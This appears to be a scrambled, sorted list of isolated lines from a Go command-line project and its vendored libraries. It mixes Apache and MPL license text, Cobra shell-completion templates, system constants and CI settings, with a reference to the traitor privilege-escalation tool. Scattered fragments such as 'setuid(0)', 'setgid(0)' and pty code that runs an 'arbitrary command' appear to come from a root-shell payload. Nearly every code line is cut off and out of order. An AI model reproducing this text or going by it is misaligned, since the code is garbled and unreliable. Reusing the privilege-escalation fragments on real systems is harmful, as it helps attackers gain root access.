    
        
            
                
                    
                        
                                Apache License
                           NULL}
                        $comp.Name = $comp.Name 
                        http://www.apache.org/licenses/
                        }
                    ${flags_completion[${index}]}
                    [System.Management.Automation.CompletionResult]::new($($comp.Name 
                    comp
                    compopt 
                    desc
                    desc=${desc:0:$(( maxdesclength - 1 ))}
                    fi
                    while($comp.Name.Length -lt $Longest) {
                    }
                    } else {
                COMPREPLY
                COMPREPLY=()
                Complete documentation is available at https://github.com/liamg/traitor
                Complete documentation is available at https://gohugo.io/documentation/
                [System.Management.Automation.CompletionResult]::new($($comp.Name 
                _arguments '
                activeHelp
                comp
                compopt 
                compopt -o nospace
                done
                fi
                for ((i = ${
                for range ch {
                hasActiveHelp=1
                if ($Values.Length -eq 1) {
                if [ ${
                if [[ ${index} -ge 0 ]]
                local index flag
                log.Fatal(err)
                love by spf13 and friends in Go.
                maxdesclength=$(( COLUMNS - ${
                panic(err)
                return 0
                return 1
                return err
                set --global __%[1]s_comp_results $split[1] $split[1].
                }
                } else {
             }
            $CursorPosition
            $Longest = $Name.Length
            $_.Name = $Flag 
            COMPREPLY
            COMPREPLY[$idx]=${COMPREPLY[$idx]
            COMPREPLY[ci]=$comp
            Default {
            [[ -z $comp ]] 
            __%[1]s_custom_func
            __%[1]s_handle_command
            __%[1]s_handle_noun
            __kubectl_get_resource
            _filedir -d
            break
            commands=()
            comp=${comp%%%%$tab
            comp=${comp//$tab/:}
            comp=${comp//:/
            comp=${comp:endIndex}
            completions
            continue
            declare -F __custom_func >/dev/null 
            desc=${comp
            else
            end
            fi
            filteringCmd
            flaghash[${flagname}]=${flagvalue}
            flaghash[${flagname}]=${words[ $((c
            fullFilter
            hasActiveHelp=0
            if [ $((directive 
            if [ $maxdesclength -gt 0 ]
            if [ ${
            if [ ${filter[1]} != '
            if [[ $cur == 
            if [[ $maxdesclength -gt 8 ]]
            lastComp=$comp
            local allflags
            longest=${
            maxdesclength=$(( COLUMNS - longest - 4 ))
            popd >/dev/null 2>
            return
            return 0
            return 1
            set -l lastChar (string sub -s -1 -- $split)
            set -l split (string split --max 1 
            set results $results[1..-2]
            while IFS='' read -r comp
            words[c]=${aliashash[${words[c]}]}
            }
          --config string    config file (default is $HOME/.cobra.yaml)
          --viper            use Viper for configuration (default true)
          Derivative Works a copy of this License
          as modifying the License.
          as part of the Derivative Works
          do not modify the License. You may add Your own attribution
          excluding those notices that do not pertain to any part of
          include a readable copy of the attribution notices contained
          of the NOTICE file are for informational purposes only and
          of the following places: within a NOTICE text file distributed
          stating that You changed the files
          that such additional attribution notices cannot be construed
          the Derivative Works
          wherever such third-party notices normally appear. The contents
        $Directive = 0
        $comp = $_
        $filteringCmd
        ${flags_completion[${index}]}
        (( suffix=${
        )
        -
        // Copy stdin to the pty and the pty to stdout.
        // Create arbitrary command.
        // Handle pty size.
        // Make sure to close the pty at the end.
        // NOTE: The goroutine will keep reading until the next keystroke before returning.
        // Set stdin in raw mode.
        // Start the command with a pty.
        BL
        COMPREPLY
        COMPREPLY[0]=$comp
        Contributions with other software (except as part of its Contributor
        Contributions.
        Executable Form how they can obtain a copy of such Source Code Form by
        Exhibit B to the Covered Software
        IFS=$'
        RET
        Secondary License.
        Version)
        [[ -z $compline ]] 
        __%[1]s_format_comp_descriptions $longest
        __%[1]s_handle_command
        __%[1]s_handle_completion_types
        __%[1]s_handle_flag
        __%[1]s_handle_go_custom_completion
        __%[1]s_handle_noun
        __%[1]s_handle_reply
        __%[1]s_handle_standard_completion_case
        _arguments '
        _init_completion -s 
        add.go
        bash_completion_func = 
        break
        c=$((c
        ch <- syscall.SIGWINCH // Initial resize.
        char    sg_erase
        char    sg_ispeed
        char    sg_kill
        char    sg_ospeed
        char    t_brkc
        char    t_dsuspc
        char    t_eofc
        char    t_flushc
        char    t_intrc
        char    t_lnextc
        char    t_quitc
        char    t_rprntc
        char    t_startc
        char    t_stopc
        char    t_suspc
        char    t_werasc
        commands.go
        comp=${COMPREPLY[ci]}
        comp=${compline%%%%$tab
        completions
        defer func() { _ = ptmx.Close() }() // Best effort.
        defer func() { signal.Stop(ch)
        delete
        directive=0
        done
        else
        end
        fi
        filteringCmd
        filteringCmd='_files'
        flagname=${flagname%%=
        flagvalue=${flagname
        for filter in ${completions[
        for filter in ${completions[@]}
        for filter in ${out}
        go func() {
        here.go
        if ( $IsEqualFlag ) {
        if ($Longest -lt $Name.Length) {
        if ($Values.Length -eq 0) {
        if ((${
        if (-Not $Description) {
        if (x=${PS1@P}) 2> /dev/null
        if [ $((directive 
        if [ ${
        if [[ $c -eq $cword ]]
        if [[ $c -eq 0 ]]
        if declare -F __%[1]s_custom_func >/dev/null
        if err != nil {
        if err := test()
        if test $numComps -eq 0
        if test $numComps -eq 1
        index=$((index
        kubectl_get 
        lastLine=${line}
        local filteringCmd
        local fullFilter filter filteringCmd
        local idx=${
        local result
        local subdir
        local suffix
        local tab=$'
        must_have_one_flag=()
        must_have_one_noun=()
        of distribution to the recipient
        or its Contributor Version.
        panic(err)
        part of a Larger Work
        result=$
        return
        return $result
        return 0
        return 1
        return nil
        rights in the Source Code Form under this License.
        server
        set --global __%[1]s_comp_results $completions
        set -l numComps (count $__%[1]s_comp_results)
        set -l prefix (commandline -t 
        set directive 0
        short   sg_flags
        switch ($Mode) {
        the Executable Form does not attempt to limit or alter the recipients
        while IFS='' read -r comp
        while [[ $((--idx)) -ge 0 ]]
        your.go
        }
        }()
       (($Directive -band $ShellCompDirectiveFilterDirs) -ne 0 ))  {
       compopt -o nospace
      (a) You must give any other recipients of the Work or
      (an example is provided in the Appendix below).
      (b) You must cause any modified files to carry prominent notices
      - bin/darwin-amd64/tml
      - bin/linux-amd64/tml
      --usefulflag int    sometimes it's very useful (default 777)
      2.0. If a copy of the MPL was not
      Contribution(s) alone or by combination of their Contribution(s)
      If You choose to distribute Source Code Form that is Incompatible With
      Mozilla Foundation is the license steward. Except as provided in Section
      PARTICULAR PURPOSE. You are solely responsible for determining the
      This Source Code Form is 
      This Source Code Form is subject to the
      With Secondary Licenses
      Work and such Derivative Works in Source or Object form.
      You may add Your own copyright statement to Your modifications and
      You may distribute the Covered Software under the terms of the version of
      add         Add a command to a Cobra Application
      and conversions to other media types.
      and distribution as defined by Sections 1 through 9 of this document.
      any Contribution intentionally submitted for inclusion in the Work
      appropriateness of using or redistributing the Work and assume any
      as of the date such litigation is filed.
      by You to the Licensor shall be under the terms and conditions of
      by such Contributor that are necessarily infringed by their
      cobra [command]
      commands=()
      copyright notice that is included in or attached to the work
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      distinguishing version number.
      either its Contributions or its Contributor Version.
      except as required for reasonable and customary use in describing the
      excluding communication that is conspicuously marked or otherwise
      exercising permissions granted by this License.
      for i := 0
      granted to You under this License for that Work shall terminate
      has been advised of the possibility of such damages.
      help        Help about any command
      http://mozilla.org/MPL/2.0/.
      init        Initialize a Cobra Application
      institute patent litigation against any entity (including a
      main.go
      may provide additional or different license terms and conditions
      means an individual or a legal entity exercising rights under this
      means the form of the work preferred for making modifications.
      meet the following conditions:
      modified license differs from this License).
      notice described in Exhibit B of this License must be attached.
      obtain one at
      of your accepting any such warranty or additional liability.
      on behalf of whom a Contribution has been received by Licensor and
      or a Contribution incorporated within the Work constitutes direct
      or by an individual or Legal Entity authorized to submit on behalf of
      or other liability obligations and/or rights consistent with this
      origin of the Work and reproducing the content of the NOTICE file.
      outstanding shares or beneficial ownership of such entity.
      publish new versions of this License. Each version will be given a
      references to the name of the license steward (except to note that such
      repo: liamg/tml
      result of this License or out of the use or inability to use the
      return nil
      risks associated with Your exercise of permissions under this License.
      steward.
      submitted to Licensor for inclusion in the Work by the copyright owner
      subsequently incorporated within the Work.
      tags: true
      the Work and Derivative Works thereof.
      the conditions stated in this License.
      the copyright owner that is granting the License.
      the original version of the Work and any modifications or additions
      the terms of any separate license agreement you may have executed
      under the terms of any subsequent version published by the license
      unless required by applicable law (such as deliberate and grossly
      version of this License if you rename the license and remove any
      where such license applies only to those patent claims licensable
      with Licensor regarding such Contributions.
      with the Work to which such Contribution(s) was submitted. If You
      }
     (see Section 10.2) or under the terms of a Secondary License (if permitted
     Contributor and that particular Contributor
     Covered Software. If the Larger Work is a combination of Covered Software
     Each Contributor represents that the Contributor believes its Contributions
     If You distribute Covered Software in Executable Form then:
     License. No additional rights or licenses will be implied from the distribution
     No Contributor makes additional grants as a result of Your choice to
     Section 2.1.
     The licenses granted in Section 2.1 with respect to any Contribution become
     The licenses granted in this Section 2 are the only rights granted under this
     This License is not intended to limit any rights You have under applicable
     You may not remove or alter the substance of any license notices (including
     You to additionally distribute such Covered Software under the terms of
     a. for any code that a Contributor has removed from Covered Software
     a. that the initial Contributor has attached the notice described in
     a. under intellectual property rights (other than patent or trademark)
     all Contributors for the Covered Software under Section 2.1 of this License
     and cross-claims) alleging that a Contributor Version directly or
     are its original creation(s) or it has sufficient rights to grant the
     b. any new file in Source Code Form that contains any Covered Software.
     b. for infringements caused by: (i) Your and any other third party
     b. that the Covered Software was made available under the terms of version
     c. under Patent Claims infringed by Covered Software in the absence of its
     compliant prior to 30 days after Your receipt of the notice.
     disclaimers of warranty and limitations of liability specific to any
     distribute the Covered Software under a subsequent version of this License
     effective for each Contribution on the date the Contributor first distributes
     either this License or such Secondary License(s).
     if such Contributor fails to notify You of the non-compliance by some
     indemnity or liability obligations to one or more recipients of Covered
     indemnity or liability terms You offer. You may include additional
     jurisdiction.
     license agreements (excluding distributors and resellers) which have been
     logos of any Contributor (except as may be necessary to comply with the
     means
     means Covered Software of a particular Contributor.
     means Source Code Form to which the initial Contributor has attached the
     means any form of the work other than Source Code Form.
     means any of the following:
     means the combination of the Contributions of others (if any) used by a
     means this document.
     non-exclusive license:
     notice requirements in Section 3.4).
     of any Contributor. You must make it absolutely clear that any such
     of liability) contained within the Source Code Form of the Covered
     ongoing basis if such Contributor notifies You of the non-compliance by
     or licensing of Covered Software under this License. Notwithstanding Section
     provided that You also comply with the requirements of this License for the
     reasonable means prior to 60 days after You have come back into compliance.
     required to remedy known factual inaccuracies.
     restrict the recipients
     rights to its Contributions conveyed by this License.
     shall terminate.
     such Contribution.
     termination shall survive termination.
     terms of this License. You must inform recipients that the Source Code Form
     then the rights granted under this License from a particular Contributor
     thereof.
     they can obtain a copy of this License. You may not attempt to alter or
     this License.
     under the terms of Section 3.3).
     validly granted by You or Your distributors under this License prior to
    $ cobra --invalid
    $ cobra help
    $Command = $CommandAst.CommandElements
    $Longest = 0
    $Mode = (Get-PSReadLineKeyHandler 
    $Out = $Out 
    $ShellCompDirectiveError=%[3]d
    $ShellCompDirectiveFilterDirs=%[7]d
    $ShellCompDirectiveFilterFileExt=%[6]d
    $ShellCompDirectiveNoFileComp=%[5]d
    $ShellCompDirectiveNoSpace=%[4]d
    $Values 
    $Values = $Out 
    $Values = $Values 
    $env:%[8]s=0
    - 
    - deadcode
    - errcheck
    - gas
    - go: tip
    - goconst
    - goimports
    - golint
    - govet
    - ineffassign
    - interfacer
    - maligned
    - megacheck
    - structcheck
    - unconvert
    - varcheck
    ...
    // Do Stuff Here
    37
    Available Commands:
    COMPREPLY=()
    Cobra is a CLI library for Go that empowers applications.
    Error: unknown flag: --invalid
    Flags:
    GOOS=$os GOARCH=$arch go build
    Long: 
    PersistentPostRun: func(cmd 
    PersistentPreRun: func(cmd 
    PostRun: func(cmd 
    PreRun: func(cmd 
    Run: func(cmd 
    This application is a tool to generate the needed files
    Usage:
    [int]$Directive = $Out[-1].TrimStart(':')
    _%[1]s
    __%[1]s_debug
    __%[1]s_extract_activeHelp
    __%[1]s_get_completion_results
    __%[1]s_handle_word
    __%[1]s_process_completion_results
    __kubectl_parse_get ${nouns[${
    api_key:
    c=$((c
    case $COMP_TYPE in
    case $cur in
    case ${last_command} in
    complete -o default -F __start_%[1]s %[1]s
    complete -o default -F __start_%s %s
    complete -o default -o nospace -F __start_%[1]s %[1]s
    complete -o default -o nospace -F __start_%s %s
    declare -A aliashash 2>/dev/null 
    declare -A flaghash 2>/dev/null 
    directive=${out
    done
    elif [ $((directive 
    elif [[ $c -eq 0 ]]
    else
    else 
    end
    esac
    fi
    file:
    flag.IntVar(
    flags=()
    flags_completion=()
    flags_with_completion=()
    fmt.Println(hex.EncodeToString(b))
    for ci in ${!COMPREPLY[
    for comp in $comps
    for line in $results[-1..1]
    func StartedByExplorer() (bool)
    git clone URL --bare
    go get github.com/spf13/pflag
    go test github.com/spf13/pflag
    hash.Read(b)
    hugo server --port=1313
    if ( $IsEqualFlag ) {
    if ($Command.Length -gt $CursorPosition) {
    if ($env:BASH_COMP_DEBUG_FILE) {
    if (($Directive -band $ShellCompDirectiveError) -ne 0 ) {
    if (($Directive -band $ShellCompDirectiveNoFileComp) -ne 0 ) {
    if (($Directive -band $ShellCompDirectiveNoSpace) -ne 0 ) {
    if ((($Directive -band $ShellCompDirectiveFilterFileExt) -ne 0 ) -or
    if [ $((directive 
    if [ $hasActiveHelp -eq 1 ]
    if [ ${
    if [[ $
    if [[ $c -ge $cword ]]
    if [[ ${
    if [[ ${index} -ge 0 ]]
    if [[ ${words[c]} != 
    if [[ ${words[c]} == 
    if [[ -n ${BASH_COMP_DEBUG_FILE:-} ]]
    if [[ -n ${file} ]]
    if [[ -n ${last_command} ]]
    if declare -F __ltrim_colon_completions >/dev/null
    if declare -F _init_completion >/dev/null 2>
    if err := someFunc()
    if err == io.EOF {
    if len(args) < 1 {
    if myapp.IsValidColor(args[0]) {
    if test $compErr -eq 1
    if test $filefilter -eq 1
    if test $nospace -ne 0
    index=-1
    index=0
    lastChar=${lastParam:$((${
    lastChar=${lastParam[-1]}
    lastParam=${words[$((${
    lastParam=${words[-1]}
    local -a completions
    local activeHelp=()
    local c=0
    local char=$2
    local command_aliases=()
    local comp
    local comp desc maxdesclength
    local completions
    local completions=()
    local compline
    local cur prev words cword split
    local endIndex=${
    local flag_parsing_disabled=
    local flagname=${words[c]}
    local flags=()
    local flags_completion=()
    local flags_with_completion=()
    local hasActiveHelp=0
    local i ci
    local index
    local kubectl_out
    local kubectl_output out
    local lastLine
    local lastParam lastChar flagPrefix requestComp out directive comp lastComp noSpace
    local local_nonpersistent_flags=()
    local longest=$1
    local longest=0
    local must_have_one_flag=()
    local must_have_one_noun=()
    local next_command
    local noun_aliases=()
    local nouns=()
    local out directive
    local out requestComp lastParam lastChar comp directive args
    local requestComp lastParam lastChar args
    local shellCompDirectiveError=%[3]d
    local shellCompDirectiveFilterDirs=%[7]d
    local shellCompDirectiveFilterFileExt=%[6]d
    local shellCompDirectiveNoFileComp=%[5]d
    local shellCompDirectiveNoSpace=%[4]d
    local startIndex=$((${
    local tab=$'
    local template
    local two_word_flags=()
    local w word=$1
    local_nonpersistent_flags=()
    nouns
    on:
    or
    os.Exit(1)
    out=$(eval ${requestComp} 2>/dev/null)
    out=${out%%:
    param(
    return 0
    return 1
    return nil
    set --erase __%[1]s_comp_results
    set --global __%[1]s_comp_results $results[1..-2]
    set -l args (commandline -opc)
    set -l compErr (math (math --scale 0 $directive / $shellCompDirectiveError) %% 2)
    set -l comps $results[1..-2]
    set -l directive (string sub --start 2 $results[-1])
    set -l directiveLine $results[-1]
    set -l dirfilter (math (math --scale 0 $directive / $shellCompDirectiveFilterDirs) %% 2)
    set -l filefilter (math (math --scale 0 $directive / $shellCompDirectiveFilterFileExt) %% 2)
    set -l flagPrefix (string match -r -- '-.
    set -l lastArg (string escape -- (commandline -ct))
    set -l nofiles (math (math --scale 0 $directive / $shellCompDirectiveNoFileComp) %% 2)
    set -l nospace (math (math --scale 0 $directive / $shellCompDirectiveNoSpace) %% 2)
    set -l results (__%[1]s_perform_completion)
    set -l results (eval $requestComp 2> /dev/null)
    set -l shellCompDirectiveError %[4]d
    set -l shellCompDirectiveFilterDirs %[8]d
    set -l shellCompDirectiveFilterFileExt %[7]d
    set -l shellCompDirectiveNoFileComp %[6]d
    set -l shellCompDirectiveNoSpace %[5]d
    setopt local_options BASH_REMATCH
    shift
    skip_cleanup: true
    to quickly create a Cobra application.
    two_word_flags=()
    versions[i] = v
    while IFS='
    while IFS='' read -r comp
    while IFS='' read -r compline
    }
   1. Definitions.
   2. Grant of Copyright License. Subject to the terms and conditions of
   3. Grant of Patent License. Subject to the terms and conditions of
   4. Redistribution. You may reproduce and distribute copies of the
   6. Trademarks. This License does not grant permission to use the trade
   7. Disclaimer of Warranty. Unless required by applicable law or
   9. Accepting Warranty or Additional Liability. While redistributing
   Any litigation relating to this License may be brought only in the courts of
   Covered Software is provided under this License on an 
   If it is impossible for You to comply with any of the terms of this License
   License. No use of  any Covered Software is authorized under this License
   Some jurisdictions do not allow the exclusion or limitation of incidental or
   This License represents the complete agreement concerning the subject matter
   a clear title and description of what the feature is and why it would be
   a jurisdiction where the defendant maintains its principal place of business
   beneficial to the project and its users.
   contract shall be construed against the drafter shall not be used to construe
   correction. This disclaimer of warranty constitutes an essential part of this
   distributions of the Covered Software under this License. Except to the
   enforceable. Any law or regulation which provides that the language of a
   ensure code consistency. Run 
   etc...). Also state the current behavior vs. the expected behavior.
   except under this disclaimer.
   for the feature. Tests can be run via 
   http://www.apache.org/licenses/LICENSE-2.0
   indicates mutually exclusive information. You can use the argument to the left of the separator or the
   informed of the possibility of such damages. This limitation of liability
   party
   prevent a party
   provision shall be reformed only to the extent necessary to make it
   reference to its conflict-of-law provisions. Nothing in this Section shall
   risk as to the quality and performance of the Covered Software is with You.
   shall not apply to liability for death or personal injury resulting from such
   sign a CLA. Please sign the CLA :slightly_smiling_face:
   sufficiently detailed for a recipient of ordinary skill to be able to
   they affect. Such description must be placed in a text file included with all
   this License against a Contributor.
   to comment on it.
   to the maximum extent possible
   understand it.
  $ %[1]s completion bash > $(brew --prefix)/etc/bash_completion.d/%[1]s
  $ %[1]s completion bash > /etc/bash_completion.d/%[1]s
  $ %[1]s completion fish 
  $ %[1]s completion fish > 
  $ source <(%[1]s completion bash)
  - 1.10.x
  - 1.11.x
  - 1.4.3
  - 1.5.3
  - 1.9.x
  - GO111MODULE=on
  - a flag may appear in multiple groups
  - a group may contain any number of flags
  - both local and persistent flags can be used
  - export PATH=$GOPATH/bin:$PATH
  - go get golang.org/x/lint/golint
  - go install ./...
  - go test -v ./...
  - go test ./...
  - provider: releases
  - tip
  - verify/all.sh -v
  // { int nosys(void)
  Args: func(cmd 
  Long: 
  Long:  
  PS> %[1]s completion powershell 
  PS> %[1]s completion powershell > %[1]s.ps1
  Run: func(cmd 
  RunE: func(cmd 
  allow_failures:
  char 
  cmd.Execute()
  cmdEcho.AddCommand(cmdTimes)
  cmdTimes.Flags().IntVarP(
  deadline: 5m
  disable-all: true
  done
  echo $@ >
  echo2
  enable:
  exit(0)
  fast: false
  fmt.Println()
  for arch in $@
  if err := rootCmd.Execute()
  os=$1
  return
  rootCmd.AddCommand(subCmd)
  rootCmd.AddCommand(tryCmd)
  rootCmd.AddCommand(versionCmd)
  rootCmd.Execute()
  rootCmd.PersistentFlags().StringVar(
  setgid(0)
  setuid(0)
  shift
  used to turn on file completion 
  var cmdEcho = 
  var cmdPrint = 
  var cmdTimes = 
  var echoTimes int
  var rootCmd = 
  var subCmd = 
  {{.CommandPath}} [command]{{end}}{{if gt (len .Aliases) 0}}
  {{.NameAndAliases}}{{end}}{{if .HasExample}}
  {{.UseLine}}{{end}}{{if .HasAvailableSubCommands}}
  {{rpad .CommandPath .CommandPathPadding}} {{.Short}}{{end}}{{end}}{{end}}{{if .HasAvailableSubCommands}}
  {{rpad .Name .NamePadding }} {{.Short}}{{end}}{{end}}{{end}}{{if .HasAvailableLocalFlags}}
 !(ok 
 !aix
 !c.CompletionOptions.DisableDescriptions
 !c.HasSubCommands() {
 !c.SilenceErrors {
 !c.SilenceUsage {
 !c.commandsAreSorted {
 !cmd.Root().TraverseChildren {
 !darwin 
 !disableFormatting {
 !dragonfly 
 !flagCompletion) {
 !found {
 !foundLocalNonPersistentFlag {
 !freebsd 
 !go1.13
 !ios
 !ios) 
 !isInSurrogateArea
 !linux 
 !netbsd 
 !ok {
 !openbsd 
 !os.IsNotExist(err) {
 !otherNumeric 
 !otherNumeric {
 !pflag.Changed {
 !plan9
 !ppc64
 !ppc64le 
 !race
 !race) 
 !solaris
 !solaris 
 !supportsABI(_dragonflyABIChangeVersion) {
 !v.isVulnerableOther() {
 !vPre:
 !windows 
 !zos 
 $2 
 $CC -x c - -E -dM $ccflags 
 $COLUMNS stores the current shell width.
 $GORUN ./_errors 
 $Out is an array contains each line per element
 $_.Name
 $key == NO_ERROR ]]
 $next_command
 $run
 $value == NO_ERROR ]]
 $vtype == 
 '-.
 '0')
 (1<<32 - 1)
 (386 
 (O_RDONLY 
 (STATUS_[
 (We cannot use $CURSOR as its value does not work when a command is an alias.)
 (arm 
 (b[n-1] == '
 (darwin 
 (filtering by directory)
 (filtering by file extension)
 (freebsd 
 (gofmt -d $(SRC)
 (hasPasswd 
 (including the use of the 
 (linux 
 (maj == 6 
 (minor))
 (mips 
 (mips64 
 (mipsle 
 (not supported by bash)
 (or
 (or 
 (param_len
 (ppc64 
 (ppc64le 
 (r >= 'A' 
 (req != TCSETSF) {
 (req != TCSETSW) 
 (see above).
 (syntax of 
 (uint64(minor) 
 (uintptr(len(entry)) 
 (use of $ in variable names is a gcc extension).  The hardest
 (windows.ENABLE_ECHO_INPUT 
 - Add 
 - Complete (works like bash)
 - Introduce 
 - MenuComplete (works like zsh)
 - Obtain the completions and store them in the global __%[1]s_comp_results
 - Prevent 
 - Return false if file completion should be performed
 - TabCompleteNext (default windows style - on each key press the next option is displayed)
 - enables combining existing checks with arbitrary other checks (e.g. you want to check the ExactArgs length along with other qualities).
 - file completion will be performed (so there will be choices after the activeHelp)
 - the command will accept any args.
 - the command will report an error if the number of args is not between the minimum and maximum number of expected args.
 - the command will report an error if there are any positional args that are not in the 
 - the command will report an error if there are any positional args.
 - the command will report an error if there are more than N positional args.
 - the command will report an error if there are not at least N positional args.
 - the command will report an error if there are not exactly N positional args OR if there are any positional args that are not in the 
 - the command will report an error if there are not exactly N positional args.
 -------------   
 -------------    
 --flagname       
 --flagname=1357  
 -D dir]... [-f format] profile
 -eq 0 ]]
 -n $value ]] 
 // avoid need for single quotes below
 /IOC_MAGIC/ 
 /bin/pwd):/build generate:$GOOS
 002))
 010))
 013))
 0377 }
 0x00000000000000ff) >> 0)
 0x00000000000fff00) >> 8)
 0x00000000FFFFFFFF) 
 0x00000000ffffffff) >> 0)
 0x000000ff
 0x000000ff) << 0
 0x000000ff) >> 0)
 0x00000fff) << 8
 0x00000ffffff00000) >> 12)
 0x0000FFFF)
 0x0000ff00
 0x0000ff00) >> 8)
 0x000fff00
 0x000fff00) >> 8)
 0x01FFFFFFFFFFFFFF)
 0x0f) 
 0x0fff)
 0x100
 0x101
 0x102
 0x103
 0x1f)
 0x20 // Version 2
 0x200
 0x201
 0x202
 0x203
 0x204
 0x205
 0x206
 0x207
 0x208
 0x209
 0x20A
 0x20B
 0x20C
 0x20D
 0x20E
 0x20F
 0x210
 0x211
 0x212
 0x213
 0x214
 0x215
 0x216
 0x217
 0x218
 0x219
 0x21A
 0x21B
 0x21C
 0x21D
 0x21E
 0x21F
 0x220
 0x221
 0x222
 0x223
 0x224
 0x225
 0x226
 0x227
 0x228
 0x229
 0x22A
 0x22B
 0x22C
 0x22D
 0x22E
 0x22F
 0x230
 0x231
 0x232
 0x233
 0x234
 0x235
 0x236
 0x238
 0x239
 0x23A
 0x23B
 0x23C
 0x23D
 0x23E
 0x23F
 0x240
 0x241
 0x242
 0x243
 0x244
 0x245
 0x246
 0x247
 0x248
 0x249
 0x24A
 0x24B
 0x24C
 0x3
 0x300
 0x3f) 
 0x3fff
 0x3fff)
 0x3fff) 
 0x3fffffff00000000) >> 32)
 0x40 // Version 4
 0x80 // RFC 4122 variant
 0x80 // Variant is 10
 0x8000
 0x8000 // Set our variant
 0xC0000000 
 0xFF
 0xFF)
 0xc0) == 0x80:
 0xe0) == 0xc0:
 0xe0) == 0xe0:
 0xff)
 0xfff00000
 0xfff00000) >> 12)
 0xffff)
 0xffff0000
 0xffff0000) >> 8)
 0xffff00ff)
 0xfffff000) << 32
 0xfffff00000000000) >> 32)
 0xffffff)
 0xffffff00) << 12
 0xffffffff)
 1 for NUL
 1 for the 
 1 for the (deliberate) off-by-one in maxlen-sidx
 1 {
 1) 
 1) % s.max
 1) CompletionText text to be used as the auto completion result
 10)
 100
 100)
 1000
 10000000 // 100s of a nanoseconds between epochs
 1000}
 1024
 103
 104
 12)))
 1]byte
 1]uint16
 1e3
 1e6)
 2 comes from 
 2) ListItemText   text to be displayed in the suggestion list
 2013 Steve Francia <spf@spf13.com>.
 2022 Steve Francia <spf@spf13.com>.
 2: // {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
 2]_C_int
 3) ResultType     type of completion result
 386
 386 registers
 386) 
 4) ToolTip        text for the tooltip with details about the object
 4))[:n:n]
 4]byte
 7) 
 86400    // seconds between epochs
 9: // urn:uuid:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
 9]byte
 == 0 to do no wrapping
 => d to provide the correct completion
 API consistent across platforms.
 Active Help
 Active Help for flags
 Active Help for nouns
 Active Help with Cobra's default completion command
 Adapting the default completion command
 Add the code to the image.
 Add the proper number of spaces to align the descriptions
 Adding Active Help messages
 Aliases
 Aliases for nouns
 Architecture specific extensions/prefixes
 Assign flags to a command
 Assumes GNU versions of utilities in PATH.
 Attributes
 AuthType values for SSLExtraCertChainPolicyPara struct 
 Automatic help flag recognition of 
 Automatic help generation for commands and flags
 Automatically generated man pages for your application
 Available Tags
 BYTE $0x76
 Background Colours
 Backward Compatibility
 Bash completion V2
 Bash completions
 Bash legacy dynamic completions
 Behavioral changes
 Bind Flags with Config
 Breaking Changes
 Build Systems
 Build the lib.
 Building 
 CERT_INFO_ISSUER_FLAG)
 CERT_INFO_SUBJECT_FLAG)
 CERT_QUERY_CONTENT_FLAG_CERT_PAIR)
 CERT_QUERY_CONTENT_FLAG_CRL 
 CERT_QUERY_CONTENT_FLAG_CTL 
 CERT_QUERY_CONTENT_FLAG_PFX 
 CERT_QUERY_CONTENT_FLAG_PKCS10 
 CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED 
 CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED 
 CERT_QUERY_CONTENT_FLAG_PKCS7_UNSIGNED 
 CERT_QUERY_CONTENT_FLAG_PKCS7_UNSIGNED)
 CERT_QUERY_CONTENT_FLAG_SERIALIZED_CERT 
 CERT_QUERY_CONTENT_FLAG_SERIALIZED_CRL 
 CERT_QUERY_CONTENT_FLAG_SERIALIZED_CTL 
 CERT_QUERY_CONTENT_FLAG_SERIALIZED_STORE 
 CERT_QUERY_FORMAT_FLAG_ASN_ASCII_HEX_ENCODED)
 CERT_QUERY_FORMAT_FLAG_BASE64_ENCODED 
 CI Testing
 CVE
 Call _init_completion from the bash-completion package
 Calling ${words[0]} instead of directly %[1]s allows to handle aliases
 Can't print the prompt.  Just print the
 CertGetNameString flags 
 CertGetNameString name types 
 Certificate Information Flags 
 Certificate Store close flags 
 Check for empty description and only add parentheses if needed
 Check for flag with equal sign
 Check that we are using the new build system if we should
 Checks values for SSLExtraCertChainPolicyPara struct 
 Clone and complie a riscv compatible version of the go compiler.
 Cobra
 Cobra User Contract
 Cobra provides the following functions to use for printouts in Go completion code:
 Cobra will provide the description automatically based on usage information.  You can choose to make this option configurable by your users.
 Cobra will work when 'app help
 Code of Conduct
 Command
 Command aliases so you can change things without breaking them
 Command line flag syntax
 CommandLine is set for ExitOnError.
 Commands
 Communication
 Compat IDs on install
 Complete (works like bash)
 Completion of directory names 
 Completion of nouns
 CompletionResult Arguments:
 Completions for flags
 Component files
 Concepts
 Contributing code
 Contributing to Cobra
 Contributing to Go
 Copyright 2009 The Go Authors. All rights reserved.
 Copyright 2019 The Go Authors. All rights reserved.
 Create additional commands
 Create rootCmd
 Create your main.go
 Creating your own completion command
 CryptQueryObject content type flags 
 CryptQueryObject format type flags 
 CryptQueryObject object type 
 Custom completion support (
 Custom completions implemented in Bash scripting (legacy) are not supported and will be ignored for 
 Custom completions implemented in bash scripting (legacy) are not supported and will be ignored for 
 Customizing completions
 DEFINE_KNOWN_FOLDER
 DEVNO64)
 DEVPROP_TYPEMOD_ARRAY
 DEVPROP_TYPEMOD_LIST
 DN_DISABLEABLE 
 DN_HARDWARE_ENUM 
 DN_HAS_MARK 
 DN_MF_CHILD 
 DN_MF_PARENT 
 DN_NOT_FIRST_TIMEE 
 DN_NO_SHOW_IN_DM
 DN_NT_DRIVER 
 DN_NT_ENUMERATOR 
 DN_REBAL_CANDIDATE 
 DN_REMOVABLE 
 DN_SILENT_INSTALL 
 DN_STOP_FREE_RES 
 DO NOT EDIT
 DO NOT EDIT.
 DO NOT EDIT.'
 Debugging
 Debugging Active Help
 Default usage match type is AND with value zero 
 Defining your own help
 Defining your own usage
 Dependencies
 Deprecating a flag or its shorthand
 Deprecation
 Deprecation summary
 Description
 Description will not be shown because that's not possible with TabCompleteNext
 Descriptions for completions
 Direct access
 Disable ActiveHelp which is not supported for bash completion v1
 Disable ActiveHelp which is not supported for fish shell
 Disable sorting of flags
 Disclaimer
 Do full file completion instead
 Do not use quotes around the $completions variable or else newline
 Do not use quotes around the $out variable or else newline
 Documentation 
 Don't pad the descriptions so we can fit more text after the completion
 Download/Install
 Dynamic completion of nouns
 Easy subcommand-based CLIs: 
 Error code.  No completion.
 ErrorStatus values for CertTrustStatus struct 
 Errors accessing system attrs are ignored so that
 Example
 Examples
 Expose the ioctl function
 Exposed directly
 Extract all args except the last one
